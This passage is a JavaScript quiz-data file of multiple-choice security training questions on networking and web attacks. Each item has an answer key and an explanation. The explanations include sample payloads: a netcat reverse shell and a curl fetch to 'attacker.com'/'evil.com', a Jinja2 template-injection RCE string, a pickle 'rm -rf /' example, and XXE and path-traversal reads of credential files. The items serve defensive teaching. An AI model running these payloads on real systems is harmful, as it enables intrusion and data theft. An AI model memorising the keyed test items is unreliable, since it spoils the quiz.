            explanation: '📋 RFC 1918 Private Ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. 100.64.0.0/10 = RFC 6598 Shared Address Space (carrier-grade NAT / CGNAT), NOT private addresses. Used by ISPs for internal network when IPv4 exhausted. Also: 127.0.0.0/8 (loopback), 169.254.0.0/16 (APIPA link-local). Common interview trap question. Non-routable on public internet but different purposes.'
        },
        {
            id: 'net66',
            title: 'TCP Timestamp Option',
            points: 9,
            question: 'TCP Timestamp option - what is its primary purpose?',
            type: 'radio',
            options: [
                { value: 'rtt', text: 'Measure Round-Trip Time (RTT) for performance' },
                { value: 'security', text: 'Prevent replay attacks' },
                { value: 'sync_clocks', text: 'Synchronize host clocks' },
                { value: 'sequence', text: 'Replace sequence numbers' },
                { value: 'encryption', text: 'Enable encryption' }
            ],
            correct: 'rtt',
            explanation: '⏱️ TCP Timestamps (RFC 1323): Measure RTT accurately for better congestion control and timeout calculations. Also enables PAWS (Protection Against Wrapped Sequences) for high-speed networks. Security concern: Can leak system uptime for OS fingerprinting. Disable if paranoid: echo 0 > /proc/sys/net/ipv4/tcp_timestamps. Wireshark: See TSval/TSecr in TCP options. Interview: "What TCP options improve performance?"'
        },
        {
            id: 'net67',
            title: 'Jumbo Frames',
            points: 8,
            question: 'When should you enable Jumbo Frames (9000 byte MTU)?',
            type: 'radio',
            options: [
                { value: 'storage', text: 'Storage/backup networks with all devices supporting it' },
                { value: 'always', text: 'Always - better performance' },
                { value: 'internet', text: 'Internet-facing connections' },
                { value: 'wifi', text: 'Wi-Fi networks' },
                { value: 'vpn', text: 'VPN connections' }
            ],
            correct: 'storage',
            explanation: '📦 Jumbo Frames: 9000-byte MTU vs standard 1500. Benefits: ~15-20% throughput increase, lower CPU usage (fewer packets to process). Requirements: ALL devices in path must support (switches, NICs, routers). Use cases: Storage networks (iSCSI, NFS), backup, datacenter interconnects. DON\'T use: Internet traffic (fragmentation), mixed networks (performance degrades). Common mistake: Enable on server but not switches = worse performance. Test: ping -M do -s 8972 (Linux) to verify path MTU.'
        },
        {
            id: 'net68',
            title: 'QUIC Protocol',
            points: 12,
            question: 'QUIC protocol (HTTP/3) - what transport does it use?',
            type: 'radio',
            options: [
                { value: 'udp', text: 'UDP - User Datagram Protocol' },
                { value: 'tcp', text: 'TCP - Transmission Control Protocol' },
                { value: 'sctp', text: 'SCTP - Stream Control' },
                { value: 'icmp', text: 'ICMP' },
                { value: 'ip', text: 'Direct IP' }
            ],
            correct: 'udp',
            explanation: '🚀 QUIC = Quick UDP Internet Connections. Built on UDP to avoid TCP head-of-line blocking and enable faster deployment (no kernel/middlebox changes). Features: Built-in encryption (TLS 1.3), connection migration (Wi-Fi to cellular seamless), 0-RTT connection establishment. Used by: Google, YouTube, Facebook. HTTP/3 uses QUIC. Firewall challenge: Runs on UDP 443, looks different from traditional TCP. Interview: "Why did Google create QUIC?" Modern protocol SOC analysts need to understand.'
        },
        {
            id: 'net69',
            title: 'MAC Flooding Attack',
            points: 10,
            question: 'Attacker floods switch with thousands of fake MAC addresses. What is the goal?',
            type: 'radio',
            options: [
                { value: 'overflow_cam', text: 'Overflow CAM table - turn switch into hub' },
                { value: 'dos', text: 'Denial of service' },
                { value: 'steal_macs', text: 'Steal MAC addresses' },
                { value: 'arp_poison', text: 'ARP poisoning' },
                { value: 'vlan_hop', text: 'VLAN hopping' }
            ],
            correct: 'overflow_cam',
            explanation: '💥 MAC Flooding: Overwhelm switch CAM (Content Addressable Memory) table with fake MAC addresses. When full, switch fails-open mode = broadcasts ALL traffic like a hub. Attacker sniffs all network traffic. Tool: macof from dsniff. Defense: Port security (limit MAC addresses per port), dynamic ARP inspection, 802.1X authentication. Modern switches: Fail-closed or drop unknown MACs. Interview: "What\'s the difference between MAC flooding and ARP spoofing?"'
        },
        {
            id: 'net70',
            title: 'TCP Fast Open',
            points: 11,
            question: 'TCP Fast Open (TFO) - what does it eliminate?',
            type: 'radio',
            options: [
                { value: 'handshake_rtt', text: '1 RTT from handshake - send data in SYN' },
                { value: 'encryption', text: 'Encryption overhead' },
                { value: 'checksums', text: 'Checksum calculations' },
                { value: 'window', text: 'Window scaling' },
                { value: 'retransmit', text: 'Retransmissions' }
            ],
            correct: 'handshake_rtt',
            explanation: '⚡ TCP Fast Open (RFC 7413): Sends application data in initial SYN packet using cookie. Normal: SYN → SYN-ACK → ACK → Data (3 RTT). TFO: SYN+Data → SYN-ACK+Data → ACK (1 RTT saved). Security: Cookie prevents SYN flood amplification. Enabled: Linux (net.ipv4.tcp_fastopen), modern browsers. Use case: Reduce latency for short connections (HTTP requests). Interview: "How can TCP be faster?" Understanding TFO shows advanced networking knowledge.'
        }
    ],
    webattacks: [
        {
            id: 'web1',
            title: 'XSS Attack Detection',
            points: 8,
            question: 'Which of the following web application logs shows a reflected XSS attack attempt?',
            type: 'radio',
            options: [
                { value: 'xss', text: 'GET /search?q=&lt;script&gt;alert&lt;/script&gt;' },
                { value: 'sqli', text: "POST /login user=admin' OR 1=1--" },
                { value: 'lfi', text: 'GET /download?file=../../../../etc/passwd' },
                { value: 'idor', text: 'GET /api/user/profile?id=1337' },
                { value: 'xxe', text: 'POST /xml &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;' },
                { value: 'rce', text: 'GET /admin.php?cmd=whoami' }
            ],
            correct: 'xss',
            explanation: '🔴 Reflected XSS: <script> tag in search parameter will execute JavaScript if echoed back in HTML response. Attack flow: 1) Attacker crafts malicious URL, 2) Victim clicks link, 3) Server reflects input into page, 4) Browser executes script, 5) Cookies/session stolen. Defense: Output encoding, CSP headers, input validation. OWASP Top 10 #3.'
        },
        {
            id: 'web2',
            title: 'Defense Mechanisms',
            points: 12,
            question: 'Which defenses are effective against their respective attacks? (Select ALL that apply)',
            type: 'checkbox',
            options: [
                { value: 'prep_sql', text: 'Prepared statements prevent SQL injection' },
                { value: 'csp_xss', text: 'Content Security Policy mitigates XSS' },
                { value: 'waf_ddos', text: 'Web Application Firewall stops all DDoS attacks' },
                { value: 'token_csrf', text: 'Anti-CSRF tokens prevent Cross-Site Request Forgery' },
                { value: 'encode_xss', text: 'Output encoding prevents XSS' },
                { value: 'authz_idor', text: 'Proper authorization checks prevent IDOR' },
                { value: 'blacklist_xss', text: 'Blacklisting <script> tags eliminates all XSS' },
                { value: 'captcha_sqli', text: 'CAPTCHA prevents SQL injection attacks' }
            ],
            correct: ['prep_sql', 'csp_xss', 'token_csrf', 'encode_xss', 'authz_idor'],
            explanation: '✅ CORRECT: Prepared statements (parameterized queries), CSP headers, anti-CSRF tokens, output encoding (HTML entity encoding), proper authorization. ❌ WRONG: WAF cannot stop volumetric DDoS (need CDN/Cloudflare). Blacklisting fails (bypass: <ScRiPt>, <img onerror=>, etc). CAPTCHA stops bots, not SQL injection syntax.'
        },
        {
            id: 'web3',
            title: 'Path Traversal Analysis',
            points: 10,
            question: 'A web server receives: <code>GET /docs/../../../../windows/system32/config/sam HTTP/1.1</code><br>What is the attacker attempting?',
            type: 'radio',
            options: [
                { value: 'sam', text: 'Accessing Windows password hashes (SAM database)' },
                { value: 'system', text: 'Accessing SYSTEM registry hive for boot keys' },
                { value: 'shadow', text: 'Accessing Linux shadow password file' },
                { value: 'hosts', text: 'Reading system hosts file for network mapping' },
                { value: 'config', text: 'Downloading web.config with database credentials' }
            ],
            correct: 'sam',
            explanation: '⚠️ Path Traversal (Directory Traversal): Using "../" sequences to escape web root (/docs/) and navigate to C:\\Windows\\System32\\config\\SAM. SAM file = Security Account Manager database containing NTLM password hashes. If attacker downloads SAM + SYSTEM files, they can crack passwords offline. Defense: Input validation, chroot jails, whitelist allowed files. CWE-22, OWASP Top 10 #1 (Broken Access Control).'
        },
        {
            id: 'web4',
            title: 'Blind SQL Injection Detection',
            points: 9,
            question: 'An attacker sends: <code>GET /product?id=5 AND 1=1</code> (loads normally) then <code>GET /product?id=5 AND 1=2</code> (returns error). What attack is this?',
            type: 'radio',
            options: [
                { value: 'blind_sqli', text: 'Boolean-based blind SQL injection' },
                { value: 'time_sqli', text: 'Time-based blind SQL injection' },
                { value: 'error_sqli', text: 'Error-based SQL injection' },
                { value: 'union_sqli', text: 'UNION-based SQL injection' },
                { value: 'nosql', text: 'NoSQL injection with boolean operators' }
            ],
            correct: 'blind_sqli',
            explanation: '🔍 Blind SQLi: Attacker cannot see SQL errors/data but infers database structure by observing application behavior. "AND 1=1" (always TRUE) vs "AND 1=2" (always FALSE) changes response. Time-based variant: "AND SLEEP(5)". Extract data bit-by-bit: "AND ASCII(SUBSTRING(password,1,1))>97". Tools: sqlmap, Burp Intruder. Defense: Prepared statements, WAF with pattern detection. CWE-89.'
        },
        {
            id: 'web5',
            title: 'SSRF Vulnerability',
            points: 10,
            question: 'Your application has endpoint: <code>GET /fetch?url=https://example.com</code>. Attacker sends: <code>GET /fetch?url=http://169.254.169.254/latest/meta-data/</code>. What is the risk?',
            type: 'radio',
            options: [
                { value: 'ssrf_metadata', text: 'Server-Side Request Forgery accessing AWS metadata service' },
                { value: 'xss', text: 'Reflected XSS via URL parameter' },
                { value: 'open_redirect', text: 'Open redirect to malicious site' },
                { value: 'ddos', text: 'DDoS amplification attack' },
                { value: 'sqli', text: 'SQL injection in URL parameter' },
                { value: 'path_traversal', text: 'Path traversal to local files' }
            ],
            correct: 'ssrf_metadata',
            explanation: '☁️ SSRF (Server-Side Request Forgery): Server makes requests to internal resources. 169.254.169.254 = AWS metadata endpoint containing IAM credentials, SSH keys, secrets. Attack chain: SSRF → metadata → AWS keys → full cloud compromise. Also targets: localhost:6379 (Redis), localhost:9200 (Elasticsearch), internal APIs. Defense: URL whitelist, disable metadata endpoint (IMDSv2), network segmentation. CWE-918, OWASP Top 10 #10.'
        },
        {
            id: 'web6',
            title: 'XXE Attack Pattern',
            points: 8,
            question: 'POST request contains:<br><code>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;<br>&lt;user&gt;&lt;name&gt;&xxe;&lt;/name&gt;&lt;/user&gt;</code><br>What is the attack?',
            type: 'radio',
            options: [
                { value: 'xxe', text: 'XML External Entity injection' },
                { value: 'xss', text: 'Cross-Site Scripting via XML' },
                { value: 'sqli', text: 'SQL injection through XML parsing' },
                { value: 'xpath', text: 'XPath injection attack' },
                { value: 'xslt', text: 'XSLT transformation exploit' }
            ],
            correct: 'xxe',
            explanation: '📄 XXE (XML External Entity): XML parsers process external entities defined in DOCTYPE. Attack reads local files (/etc/passwd, C:\\Windows\\win.ini), scans internal network (SSRF via XXE), causes DoS (billion laughs). Tools: Burp Suite, xxeserve. Defense: Disable external entities in XML parser (libxml_disable_entity_loader), use JSON instead of XML, validate DTD. CVE-2013-4152 (Python), OWASP Top 10 #4.'
        },
        {
            id: 'web7',
            title: 'Command Injection Indicators',
            points: 9,
            question: 'Web app executes: <code>ping -c 4 [user_input]</code>. Attacker submits: <code>8.8.8.8; cat /etc/shadow</code>. Select the vulnerability:',
            type: 'radio',
            options: [
                { value: 'rce', text: 'OS Command Injection' },
                { value: 'sqli', text: 'SQL injection with semicolon terminator' },
                { value: 'xss', text: 'Stored XSS in ping results' },
                { value: 'lfi', text: 'Local File Inclusion' },
                { value: 'xxe', text: 'XML External Entity' },
                { value: 'path_traversal', text: 'Path traversal with shadow file access' }
            ],
            correct: 'rce',
            explanation: '💀 Command Injection: Unsanitized input passed to system shell. Semicolon ";" chains commands. Other payloads: "8.8.8.8 && whoami", "8.8.8.8 | nc attacker.com 4444 -e /bin/bash" (reverse shell), "8.8.8.8 `curl evil.com/shell.sh`". Read /etc/shadow → crack root password. Defense: Never pass user input to shell, use libraries (Python ping3), whitelist IP format, escape metacharacters. CWE-78, OWASP #3.'
        },
        {
            id: 'web8',
            title: 'File Upload Vulnerability',
            points: 10,
            question: 'File upload accepts: <code>avatar.jpg</code>. Attacker uploads: <code>shell.php.jpg</code> with PHP code and MIME type image/jpeg. What should you check?',
            type: 'checkbox',
            options: [
                { value: 'magic_bytes', text: 'Validate file magic bytes' },
                { value: 'rename', text: 'Rename uploaded files' },
                { value: 'noexec', text: 'Store uploads in non-executable directory' },
                { value: 'mime_only', text: 'MIME type validation is sufficient' },
                { value: 'extension_only', text: 'Block .php extension only' },
                { value: 'size', text: 'Check file size only' }
            ],
            correct: ['magic_bytes', 'rename', 'noexec'],
            explanation: '📤 File Upload Bypass: Attackers use double extensions (.php.jpg), null bytes (shell.php%00.jpg), MIME type spoofing. PHP webshell = full server control. Defense: 1) Check magic bytes (FF D8 FF = JPEG), 2) Rename files (UUID.jpg), 3) Store outside webroot or disable script execution (.htaccess: php_flag engine off), 4) Scan with antivirus. Tools: Weevely, b374k. OWASP Top 10 #8 (Software/Data Integrity Failures).'
        },
        {
            id: 'web9',
            title: 'Deserialization Attack',
            points: 11,
            question: 'Application uses: <code>pickle.loads(base64.decode(cookie))</code> in Python. Attacker sends crafted cookie. What is the risk?',
            type: 'radio',
            options: [
                { value: 'deser_rce', text: 'Insecure deserialization leading to Remote Code Execution' },
                { value: 'xss', text: 'XSS via cookie injection' },
                { value: 'sqli', text: 'SQL injection through cookie parameter' },
                { value: 'session', text: 'Session hijacking only' },
                { value: 'csrf', text: 'CSRF token bypass' },
                { value: 'idor', text: 'IDOR via manipulated object ID' }
            ],
            correct: 'deser_rce',
            explanation: '⚠️ Insecure Deserialization: Pickle/marshal (Python), unserialize (PHP), readObject (Java) execute code during object reconstruction. Attacker crafts malicious serialized object → pickle.loads() triggers __reduce__ → os.system("rm -rf /"). Also affects: Java (Apache Commons, ysoserial), .NET, Ruby. Defense: Never deserialize untrusted data, use JSON, implement signature validation. CVE-2017-9805 (Apache Struts), OWASP Top 10 #8.'
        },
        {
            id: 'web10',
            title: 'CORS Misconfiguration',
            points: 7,
            question: 'API responds with:<br><code>Access-Control-Allow-Origin: *<br>Access-Control-Allow-Credentials: true</code><br>What is the vulnerability?',
            type: 'radio',
            options: [
                { value: 'cors', text: 'Wildcard origin with credentials allows any site to steal authenticated data' },
                { value: 'xss', text: 'XSS vulnerability in CORS headers' },
                { value: 'csrf', text: 'CSRF protection bypass' },
                { value: 'clickjack', text: 'Clickjacking via relaxed CORS' },
                { value: 'none', text: 'No vulnerability' },
                { value: 'sqli', text: 'SQL injection in origin header' }
            ],
            correct: 'cors',
            explanation: '🌐 CORS Misconfiguration: Wildcard (*) with credentials = browsers reject request for security. But some apps reflect Origin header without validation. Evil.com makes request → API returns Access-Control-Allow-Origin: evil.com → steals user data. Attack: fetch("https://api.victim.com/user", {credentials: "include"}). Defense: Whitelist specific origins, never use * with credentials, validate Origin header. CWE-942.'
        },
        {
            id: 'web11',
            title: 'Clickjacking Defense',
            points: 6,
            question: 'To prevent clickjacking (UI redressing), which HTTP header should be set?',
            type: 'radio',
            options: [
                { value: 'xfo', text: 'X-Frame-Options: DENY or SAMEORIGIN' },
                { value: 'csp_frame', text: 'Content-Security-Policy: frame-ancestors \'none\'' },
                { value: 'both', text: 'Both X-Frame-Options and CSP frame-ancestors' },
                { value: 'cors', text: 'Access-Control-Allow-Origin: null' },
                { value: 'hsts', text: 'Strict-Transport-Security' },
                { value: 'csp_script', text: 'Content-Security-Policy: script-src \'self\'' }
            ],
            correct: 'both',
            explanation: '🖼️ Clickjacking: Attacker embeds victim site in invisible iframe, overlays fake UI, tricks user into clicking (e.g., "Delete Account" hidden under "Play Video"). Defense: X-Frame-Options (legacy, deprecated) + CSP frame-ancestors (modern). Example: "frame-ancestors \'self\' trusted.com". Tools to test: Burp Clickbandit. Also use: confirm dialogs for sensitive actions. OWASP Clickjacking Guide.'
        },
        {
            id: 'web12',
            title: 'JWT Vulnerability',
            points: 9,
            question: 'JWT token header shows: <code>{"alg":"none","typ":"JWT"}</code>. Attacker modifies payload and removes signature. What vulnerability?',
            type: 'radio',
            options: [
                { value: 'jwt_none', text: 'Algorithm confusion' },
                { value: 'jwt_weak', text: 'Weak signature algorithm' },
                { value: 'xss', text: 'XSS in JWT payload' },
                { value: 'replay', text: 'Token replay attack' },
                { value: 'sqli', text: 'SQL injection via JWT claims' },
                { value: 'timing', text: 'Timing attack on signature validation' }
            ],
            correct: 'jwt_none',
            explanation: '🔑 JWT Algorithm Confusion: Setting "alg":"none" disables signature validation. Attacker changes payload (e.g., "user":"admin") without valid signature. Other JWT attacks: 1) alg: RS256→HS256 (use public key as symmetric secret), 2) kid header injection, 3) weak secret brute force. Defense: Explicitly reject "none" algorithm, use strong secrets (256+ bits), validate "alg" header. Tools: jwt_tool, hashcat for cracking. CWE-347.'
        },
        {
            id: 'web13',
            title: 'LDAP Injection',
            points: 8,
            question: 'Login query: <code>(uid=$username)(password=$password)</code>. User enters username: <code>*)(uid=*))(|(uid=*</code>. What happens?',
            type: 'radio',
            options: [
                { value: 'ldap_bypass', text: 'LDAP injection bypassing authentication' },
                { value: 'sqli', text: 'SQL injection attack' },
                { value: 'xss', text: 'XSS via LDAP query' },
                { value: 'buffer', text: 'Buffer overflow in LDAP parser' },
                { value: 'dos', text: 'Denial of Service only' }
            ],
            correct: 'ldap_bypass',
            explanation: '🔍 LDAP Injection: LDAP filter syntax uses parentheses/operators. Injected input creates: (&(uid=*)(uid=*)(password=*))(|(uid=*)). The "OR (uid=*)" makes query always true → authentication bypass. Extract all users: "*)(uid=*))(|(uid=*". Blind LDAP injection possible. Defense: Escape special chars ( ) * | & =, use parameterized queries, least privilege LDAP account. CWE-90.'
        },
        {
            id: 'web14',
            title: 'Template Injection (SSTI)',
            points: 10,
            question: 'Web app uses Jinja2: <code>render_template_string("Hello " + user_input)</code>. User enters: <code>{{7*7}}</code> and sees "49". What attack?',
            type: 'radio',
            options: [
                { value: 'ssti', text: 'Server-Side Template Injection' },
                { value: 'xss', text: 'Client-side XSS' },
                { value: 'sqli', text: 'SQL injection with math operators' },
                { value: 'eval', text: 'Direct eval() vulnerability' },
                { value: 'xxe', text: 'XML template injection' }
            ],
            correct: 'ssti',
            explanation: '🔥 SSTI (Server-Side Template Injection): Template engines (Jinja2, Twig, Freemarker) execute code server-side. {{7*7}}=49 confirms SSTI. RCE payload: {{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}. Frameworks: Flask (Jinja2), Spring (Thymeleaf), Laravel (Blade). Defense: Never pass user input to render_template_string(), use sandboxed templates, escape output. Tools: tplmap. CWE-94.'
        },
        {
            id: 'web15',
            title: 'GraphQL Security',
            points: 8,
            question: 'GraphQL API allows query: <code>{users{id name email ssn}}</code>. What vulnerability class is this?',
            type: 'radio',
            options: [
                { value: 'idor_exposure', text: 'Excessive data exposure / broken access control' },
                { value: 'sqli', text: 'SQL injection in GraphQL resolver' },
                { value: 'dos', text: 'GraphQL query depth DoS' },
                { value: 'xss', text: 'XSS in GraphQL response' },
                { value: 'csrf', text: 'CSRF via GraphQL mutation' }
            ],
            correct: 'idor_exposure',
            explanation: '📊 GraphQL Over-fetching: Unlike REST (fixed endpoints), GraphQL lets clients request ANY fields. Query returns SSN for all users without authorization check. Other GraphQL attacks: 1) Deep nested queries (DoS), 2) Introspection enabled (schema disclosure), 3) Batching attacks (brute force). Defense: Field-level authorization, disable introspection in prod, query depth limiting, rate limiting. Tools: GraphQL Voyager, InQL.'
        },
        {
            id: 'web16',
            title: 'API Rate Limiting Bypass',
            points: 7,
            question: 'API limits requests to 100/minute per IP. Which headers might attackers manipulate to bypass this?',
            type: 'checkbox',
            options: [
                { value: 'xff', text: 'X-Forwarded-For' },
                { value: 'real_ip', text: 'X-Real-IP' },
                { value: 'client_ip', text: 'X-Client-IP or Client-IP' },
                { value: 'user_agent', text: 'User-Agent header' },
                { value: 'referer', text: 'Referer header' },
                { value: 'cookie', text: 'Cookie header' }
            ],
            correct: ['xff', 'real_ip', 'client_ip'],
            explanation: '🚦 Rate Limit Bypass: If app trusts X-Forwarded-For header, attacker sends: "X-Forwarded-For: 1.2.3.4" (new request), "X-Forwarded-For: 1.2.3.5" (new request) → unlimited requests. Misconfigured proxies/load balancers cause this. Defense: Rate limit by authenticated user ID, validate proxy chain, use leftmost IP in X-Forwarded-For, deploy WAF. Tools: Burp Intruder with header fuzzing. OWASP API Security Top 10 #4.'
        },
        {
            id: 'web17',
            title: 'HTTP Request Smuggling',
            points: 11,
            question: 'Request contains both <code>Content-Length: 50</code> and <code>Transfer-Encoding: chunked</code>. What attack is possible?',
            type: 'radio',
            options: [
                { value: 'smuggling', text: 'HTTP Request Smuggling' },
                { value: 'dos', text: 'Denial of Service via malformed headers' },
                { value: 'xss', text: 'XSS via header injection' },
                { value: 'cache', text: 'Cache poisoning only' },
                { value: 'sqli', text: 'SQL injection via Content-Length' }
            ],
            correct: 'smuggling',
            explanation: '🔀 HTTP Request Smuggling: Front-end/back-end servers disagree on request boundaries. CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding. Attacker sends ambiguous request → smuggles second request → bypasses security controls, poisons cache, hijacks other users\' requests. Example: Prefix other users\' requests with attacker-controlled headers. Defense: Normalize requests, reject ambiguous ones, disable back-end connection reuse. Tools: Burp Smuggler. CVE-2020-11724.'
        },
        {
            id: 'web18',
            title: 'WebSocket Security',
            points: 7,
            question: 'WebSocket connection upgrades without checking Origin header. What attacks are possible? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'csrf_ws', text: 'Cross-Site WebSocket Hijacking' },
                { value: 'mitm', text: 'Man-in-the-Middle if using ws:// instead of wss://' },
                { value: 'xss', text: 'XSS via WebSocket message injection' },
                { value: 'sqli', text: 'SQL injection through WebSocket payloads' },
                { value: 'buffer', text: 'Buffer overflow in WebSocket parser' }
            ],
            correct: ['csrf_ws', 'mitm', 'xss'],
            explanation: '🔌 WebSocket Vulnerabilities: 1) No Origin check = CSWSH (like CSRF for WebSockets) - evil.com connects to victim WebSocket with user cookies. 2) ws:// (unencrypted) = plaintext traffic, use wss:// (TLS). 3) Unsanitized messages = XSS. Also: injection attacks if WS data goes to SQL/commands. Defense: Validate Origin, use wss://, implement auth tokens, sanitize messages, rate limiting. Tools: WSSiP, OWASP ZAP WebSocket plugin.'
        },
        {
            id: 'web19',
            title: 'Business Logic Flaw',
            points: 9,
            question: 'E-commerce checkout: 1) Add item ($100), 2) Apply coupon (50% off), 3) Change quantity to -1. Final price: +$50 credit. What is this?',
            type: 'radio',
            options: [
                { value: 'logic', text: 'Business logic vulnerability' },
                { value: 'idor', text: 'IDOR allowing access to other users\' carts' },
                { value: 'sqli', text: 'SQL injection via quantity parameter' },
                { value: 'race', text: 'Race condition in payment processing' },
                { value: 'xss', text: 'XSS in coupon code field' }
            ],
            correct: 'logic',
            explanation: '🛒 Business Logic Flaws: Application correctly implements code but logic is flawed. Negative quantity = negative price = attacker gets paid. Other examples: 1) Transfer -$100 (increases balance), 2) Remove item after payment but before shipping, 3) Replay discount codes, 4) Referral bonus loops. Cannot be detected by automated scanners. Defense: Input validation (quantity > 0 && quantity < 1000), state checks, transaction integrity. OWASP Top 10 #4.'
        },
        {
            id: 'web20',
            title: 'OAuth/OpenID Security',
            points: 8,
            question: 'OAuth redirect: <code>https://victim.com/callback?code=AUTH_CODE&state=xyz</code>. Attacker changes redirect_uri during authorization. What is the attack?',
            type: 'radio',
            options: [
                { value: 'oauth_redirect', text: 'OAuth redirect_uri manipulation' },
                { value: 'csrf', text: 'CSRF attack via state parameter' },
                { value: 'xss', text: 'XSS in callback URL' },
                { value: 'phishing', text: 'Phishing via fake login page' },
                { value: 'replay', text: 'Replay attack with stolen code' }
            ],
            correct: 'oauth_redirect',
            explanation: '🔐 OAuth Redirect URI Attack: If authorization server doesn\'t validate redirect_uri, attacker can: 1) Initiate OAuth flow, 2) Change redirect_uri to https://attacker.com, 3) Victim approves, 4) AUTH_CODE sent to attacker, 5) Attacker exchanges code for access_token. Defense: Exact match redirect_uri whitelist (no wildcards), validate state parameter (CSRF), use PKCE (Proof Key for Code Exchange). IETF RFC 6749, OWASP OAuth Cheat Sheet.'
        },
        {
            id: 'web21',
            title: 'Session Fixation',
            points: 7,
            question: 'Attacker sends victim link: <code>http://bank.com/login?sessionid=ATTACKER_SESSION</code>. After victim logs in, attacker uses ATTACKER_SESSION. What attack?',
            type: 'radio',
            options: [
                { value: 'session_fixation', text: 'Session Fixation (attacker sets victim\'s session ID before login)' },
                { value: 'session_hijack', text: 'Session Hijacking' },
                { value: 'csrf', text: 'Cross-Site Request Forgery' },
                { value: 'xss', text: 'Cross-Site Scripting' },
                { value: 'phishing', text: 'Simple phishing attack' }
            ],
            correct: 'session_fixation',
            explanation: '🎯 Session Fixation: Attacker forces victim to use attacker-chosen session ID. Flow: 1) Attacker obtains valid session ID, 2) Tricks victim into using that ID (URL param, cookie injection), 3) Victim authenticates with fixed ID, 4) Attacker shares the authenticated session. vs Session Hijacking (steal existing session via XSS/sniffing). Defense: **Regenerate session ID after login** (PHP: session_regenerate_id()), reject session IDs from URL parameters, use HTTPOnly/Secure cookies. CWE-384. Modern frameworks regenerate by default.'
        },
        {
            id: 'web22',
            title: 'XML Bomb',
            points: 8,
            question: 'XML parser processes: <code>&lt;!DOCTYPE lol [&lt;!ENTITY lol "lol"&gt;&lt;!ENTITY lol2 "&lol;&lol;"&gt;...&lt;!ENTITY lol9 "&lol8;&lol8;"&gt;]&gt;</code>. What attack?',
            type: 'radio',
            options: [
                { value: 'billion_laughs', text: 'Billion Laughs / XML Bomb' },
                { value: 'xxe', text: 'XXE file disclosure attack' },
                { value: 'xss', text: 'XSS via XML injection' },
                { value: 'sqli', text: 'SQL injection through XML' },
                { value: 'buffer_overflow', text: 'Buffer overflow exploit' }
            ],
            correct: 'billion_laughs',
            explanation: '💥 Billion Laughs Attack: XML entity recursion causes exponential expansion. lol2 = lol+lol (2), lol3 = lol2+lol2 (4), ..., lol9 = 2^9 = 512 lols. Final entity = billions of "lol" strings → consume gigabytes of RAM → DoS. Also called XML Bomb. Defense: **Disable entity expansion** in XML parser (Python: defusedxml library, Java: XMLConstants.FEATURE_SECURE_PROCESSING), limit entity expansion depth/size. Similar: Zip bomb (42KB → 4.5PB). CWE-776 (Unrestricted Recursion). OWASP XML Security Cheat Sheet.'
        },
        {
            id: 'web23',
            title: 'Host Header Injection',
            points: 7,
            question: 'Attacker manipulates HTTP Host header to <code>Host: evil.com</code>. Application uses Host in password reset emails. What is risk?',
            type: 'radio',
            options: [
                { value: 'host_injection', text: 'Password reset poisoning' },
                { value: 'xss', text: 'Reflected XSS attack' },
                { value: 'sqli', text: 'SQL injection' },
                { value: 'ssrf', text: 'Server-Side Request Forgery' },
                { value: 'no_risk', text: 'No risk' }
            ],
            correct: 'host_injection',
            explanation: '🏥 Host Header Injection: App trusts Host header to build URLs. Password reset: "Click https://[$HOST]/reset?token=xyz". Attacker sets Host: evil.com → victim receives link https://evil.com/reset?token=VICTIM_TOKEN → attacker steals token, resets password. Also: Cache poisoning (web cache keys on Host), routing attacks, SSRF. Defense: **Whitelist allowed Host values**, use SERVER_NAME (config) not Host header, validate against known domains. Affects: Password resets, email verification, absolute URL generation. Tools: Burp Suite, Host header fuzzing. CWE-644.'
        },
        {
            id: 'web24',
            title: 'Race Condition Exploitation',
            points: 8,
            question: 'Banking app checks balance then withdraws. Attacker sends 100 simultaneous withdrawal requests. What vulnerability?',
            type: 'radio',
            options: [
                { value: 'race_toctou', text: 'Race condition / TOCTOU' },
                { value: 'business_logic', text: 'Business logic flaw only' },
                { value: 'sqli', text: 'SQL injection' },
                { value: 'dos', text: 'Denial of Service attack' },
                { value: 'replay', text: 'Replay attack' }
            ],
            correct: 'race_toctou',
            explanation: '⏱️ Race Condition: Thread 1: Check balance ($100) → Withdraw $50. Thread 2: Check balance ($100) → Withdraw $50. Both see $100, both withdraw → balance = $0 but withdrew $100 total. TOCTOU = state changes between check and use. Also: Coupon reuse, file upload (check → move → execute race), voting multiple times. Defense: **Atomic transactions** (database locks, SELECT FOR UPDATE), mutex/semaphore, idempotency keys, pessimistic locking. Test: Burp Intruder with parallel requests. Real-world: Starbucks race condition (2013), cryptocurrency exchange exploits. CWE-362.'
        },
        {
            id: 'web25',
            title: 'Insecure Direct Object Reference Detection',
            points: 6,
            question: 'URL changes from <code>/invoice/123</code> to <code>/invoice/124</code> show different user\'s invoice. What should app implement?',
            type: 'checkbox',
            options: [
                { value: 'authz', text: 'Authorization check' },
                { value: 'session', text: 'Session validation' },
                { value: 'indirect_ref', text: 'Indirect references' },
                { value: 'obfuscation', text: 'URL obfuscation only' },
                { value: 'rate_limit', text: 'Rate limiting' },
                { value: 'logging', text: 'Access logging' }
            ],
            correct: ['authz', 'session', 'indirect_ref'],
            explanation: '🔐 IDOR Prevention: Sequential IDs = easy enumeration. Defense layers: 1) **Authorization** (before showing invoice 124, verify current_user.id == invoice.owner_id), 2) **Authentication** (require login), 3) **Indirect refs** (use UUIDs or hashed IDs - harder to guess). Obfuscation alone insufficient (security through obscurity). Also implement: Rate limiting (slow enumeration), logging (detect suspicious access patterns). IDOR = OWASP Top 10 #1 (Broken Access Control). Example: Facebook friend list exposure, Uber trip details leak. Test: Burp Intruder increment IDs.'
        },
        {
            id: 'web26',
            title: 'Content Security Policy Bypass',
            points: 8,
            question: 'CSP header: <code>script-src \'self\' https://trusted.com</code>. Attacker finds JSONP endpoint on trusted.com. Can they execute JavaScript?',
            type: 'radio',
            options: [
                { value: 'bypass_yes', text: 'Yes' },
                { value: 'blocked', text: 'No' },
                { value: 'xss_only', text: 'Only if XSS vulnerability exists' },
                { value: 'no_risk', text: 'JSONP is safe and cannot be exploited' },
                { value: 'inline_only', text: 'Only inline scripts are blocked' }
            ],
            correct: 'bypass_yes',
